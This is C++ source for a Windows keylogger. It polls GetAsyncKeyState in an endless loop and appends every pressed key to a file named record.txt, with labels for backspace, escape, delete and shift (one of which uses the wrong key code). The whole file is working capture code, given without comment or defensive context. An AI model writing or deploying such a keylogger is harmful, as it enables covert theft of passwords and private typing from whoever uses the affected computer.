#include<iostream>
#include<fstream>
#include<windows.h>
#include<winuser.h>

#pragma comment(lib, "User32.lib")

using namespace std;

void log() {
	char key;
	while (true) {
		for (key = 8; key <= 222; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				ofstream write("record.txt", ios::app);
				switch (key) {
					case 8: 
						write << "[backspace]";
						write.close();
						break;
					case 27:
						write << "[esc]";
						write.close();
						break;
					case 127: 
						write << "[del]";
						write.close();
						break;
					case 32: 
						write << " ";
						write.close();
						break;
					case 13:
						write << "\n";
						write.close();
						break;
					case 14:
						write << "[shift]";
						write.close();
						break;
					default:
						write << key;
						write.close();
						break;
				}
			}
		}
	}
}

int main() {
	log();
	return 0;
}